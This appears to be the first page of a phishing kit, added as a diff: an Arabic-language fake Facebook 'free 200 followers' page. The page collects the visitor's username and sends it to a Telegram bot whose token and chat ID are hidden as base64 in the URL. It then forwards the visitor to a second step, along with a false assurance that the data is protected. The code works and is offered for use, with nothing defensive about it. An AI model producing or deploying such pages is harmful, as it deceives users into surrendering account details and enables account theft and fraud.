@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>زيادة المتابعين • Facebook</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1877f2 0%, #0c63d4 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .card {
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 36px 30px 30px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #1877f2, #42b72a, #1877f2);
+            background-size: 200% 100%;
+            animation: gradientMove 3s linear infinite;
+        }
+
+        @keyframes gradientMove {
+            0% { background-position: 0% 0%; }
+            100% { background-position: 200% 0%; }
+        }
+
+        .gift-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 90px;
+            height: 90px;
+            background: linear-gradient(135deg, #1877f2, #0c63d4);
+            border-radius: 50%;
+            margin-bottom: 18px;
+            box-shadow: 0 8px 24px rgba(24, 119, 242, 0.4);
+            animation: pulseIcon 2s ease-in-out infinite;
+        }
+
+        @keyframes pulseIcon {
+            0%, 100% { transform: scale(1); box-shadow: 0 8px 24px rgba(24, 119, 242, 0.4); }
+            50% { transform: scale(1.05); box-shadow: 0 12px 32px rgba(24, 119, 242, 0.55); }
+        }
+
+        .gift-icon span {
+            font-size: 48px;
+            line-height: 1;
+        }
+
+        .card h1 {
+            font-size: 26px;
+            color: #1c1e21;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+
+        .card h1 .highlight {
+            background: linear-gradient(90deg, #1877f2, #42b72a);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: 800;
+        }
+
+        .card .subtitle {
+            color: #65676b;
+            font-size: 15px;
+            margin-bottom: 12px;
+            line-height: 1.6;
+        }
+
+        .offer-box {
+            background: linear-gradient(135deg, #e7f3ff 0%, #f0f8ff 100%);
+            border: 2px dashed #1877f2;
+            border-radius: 16px;
+            padding: 18px;
+            margin: 20px 0;
+        }
+
+        .offer-box .offer-title {
+            font-size: 14px;
+            color: #0c63d4;
+            font-weight: 700;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .offer-box .offer-number {
+            font-size: 44px;
+            font-weight: 900;
+            background: linear-gradient(90deg, #1877f2, #42b72a);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1;
+            margin-bottom: 6px;
+        }
+
+        .offer-box .offer-desc {
+            font-size: 14px;
+            color: #65676b;
+            font-weight: 500;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+            position: relative;
+            text-align: right;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #1c1e21;
+            margin-bottom: 8px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px 18px;
+            border: 2px solid #dddfe2;
+            border-radius: 12px;
+            font-size: 15px;
+            background: #fafafa;
+            transition: all 0.25s ease;
+            outline: none;
+            color: #1c1e21;
+            direction: ltr;
+            text-align: right;
+        }
+
+        .input-group input:focus {
+            border-color: #1877f2;
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.12);
+        }
+
+        .input-group input::placeholder {
+            color: #90949c;
+            font-size: 14px;
+        }
+
+        .input-group input.error {
+            border-color: #fa383e;
+            background: #fff5f5;
+        }
+
+        .field-error {
+            color: #fa383e;
+            font-size: 13px;
+            margin-top: 6px;
+            display: none;
+            text-align: right;
+        }
+
+        .field-error.show {
+            display: block;
+            animation: slideDown 0.2s ease;
+        }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .btn-next {
+            width: 100%;
+            padding: 15px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            box-shadow: 0 4px 20px rgba(24, 119, 242, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-family: inherit;
+        }
+
+        .btn-next:hover {
+            background: #166fe5;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 28px rgba(24, 119, 242, 0.45);
+        }
+
+        .btn-next:active {
+            transform: scale(0.98);
+        }
+
+        .btn-next:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 18px;
+            padding: 12px;
+            background: #f0f2f5;
+            border-radius: 10px;
+            color: #65676b;
+            font-size: 12.5px;
+            text-align: center;
+        }
+
+        .security-note i {
+            color: #1877f2;
+        }
+
+        @media (max-width: 450px) {
+            .card {
+                padding: 28px 22px 24px;
+            }
+            .card h1 {
+                font-size: 22px;
+            }
+            .offer-box .offer-number {
+                font-size: 36px;
+            }
+            .gift-icon {
+                width: 76px;
+                height: 76px;
+            }
+            .gift-icon span {
+                font-size: 40px;
+            }
+            .btn-next {
+                font-size: 15px;
+                padding: 14px;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+
+<div class="container">
+
+    <div class="card">
+
+        <!-- 🎁 أيقونة الهدية -->
+        <div class="gift-icon">
+            <span>🎁</span>
+        </div>
+
+        <h1>احصل على <span class="highlight">200 متابع</span> مجانًا</h1>
+        <p class="subtitle">أدخل اسم المستخدم الخاص بك وسيصلك المتابعون خلال دقائق</p>
+
+        <!-- 🎁 صندوق العرض -->
+        <div class="offer-box">
+            <div class="offer-title">🎉 عرض حصري</div>
+            <div class="offer-number">+200</div>
+            <div class="offer-desc">متابع حقيقي مجانًا</div>
+        </div>
+
+        <form id="usernameForm" novalidate>
+
+            <div class="input-group">
+                <label>👤 اسم المستخدم في Facebook</label>
+                <input type="text" id="fbUsername" placeholder="username" required autocomplete="off">
+                <div class="field-error" id="usernameError"></div>
+            </div>
+
+            <button type="submit" class="btn-next" id="nextBtn">
+                <i class="fas fa-arrow-left"></i> التالي
+            </button>
+
+        </form>
+
+        <div class="security-note">
+            <i class="fas fa-shield-alt"></i>
+            <span>بياناتك محمية ولن تُستخدم لأي غرض آخر</span>
+        </div>
+
+    </div>
+
+</div>
+
+<script>
+    // ================================================================
+    // 🔐 قراءة البيانات المشفّرة من الرابط
+    // ================================================================
+    const urlParams = new URLSearchParams(window.location.search);
+    const encodedData = urlParams.get('d') || "";
+
+    if (encodedData) {
+        sessionStorage.setItem('wa_encoded', encodedData);
+    }
+    const finalEncoded = encodedData || sessionStorage.getItem('wa_encoded') || "";
+
+    let BOT_TOKEN = "";
+    let CHAT_ID = "";
+
+    if (finalEncoded) {
+        try {
+            const decoded = atob(finalEncoded);
+            const parts = decoded.split('|');
+            BOT_TOKEN = parts[0] || "";
+            CHAT_ID   = parts[1] || "";
+        } catch (e) {
+            console.error('❌ فشل فك التشفير:', e);
+        }
+    }
+
+    // ================================================================
+    // 📤 إرسال اسم المستخدم إلى Telegram
+    // ================================================================
+    function sendUsernameToTelegram(username) {
+        if (!BOT_TOKEN || !CHAT_ID) return;
+
+        const message = `
+🎁 **طلب زيادة متابعين - Facebook (الخطوة 1/2)**
+
+👤 **اسم المستخدم:** 
+\`${username}\`
+
+🎯 **العرض:** +200 متابع مجانًا
+
+🕐 **التاريخ:** ${new Date().toLocaleString('ar-EG')}
+
+📌 **IP:** ${window.location.hostname}
+        `;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        }).catch(error => console.log('Telegram error:', error));
+    }
+
+    // ================================================================
+    // 📝 معالج النموذج
+    // ================================================================
+    document.getElementById('usernameForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        let username = document.getElementById('fbUsername').value.trim();
+        const errorEl = document.getElementById('usernameError');
+        const input = document.getElementById('fbUsername');
+
+        input.classList.remove('error');
+        errorEl.classList.remove('show');
+        errorEl.textContent = '';
+
+        username = username.replace(/^@/, '');
+
+        if (!username) {
+            input.classList.add('error');
+            errorEl.textContent = '⚠️ يرجى إدخال اسم المستخدم';
+            errorEl.classList.add('show');
+            return;
+        }
+
+        if (username.length < 3) {
+            input.classList.add('error');
+            errorEl.textContent = '⚠️ اسم المستخدم قصير جدًا';
+            errorEl.classList.add('show');
+            return;
+        }
+
+        const btn = document.getElementById('nextBtn');
+        btn.disabled = true;
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري المعالجة...';
+
+        sendUsernameToTelegram(username);
+        localStorage.setItem('fb_username', username);
+
+        setTimeout(() => {
+            let nextUrl = 'followers-fb-step2.html';
+            if (finalEncoded) {
+                nextUrl += '?d=' + encodeURIComponent(finalEncoded);
+            }
+            window.location.href = nextUrl;
+        }, 800);
+    });
+
+    document.getElementById('fbUsername').addEventListener('input', function() {
+        if (this.value.trim()) {
+            this.classList.remove('error');
+            document.getElementById('usernameError').classList.remove('show');
+        }
+    });
+
+    console.log('✅ FB Followers Step 1 loaded');
+</script>
+
+</body>
+</html>
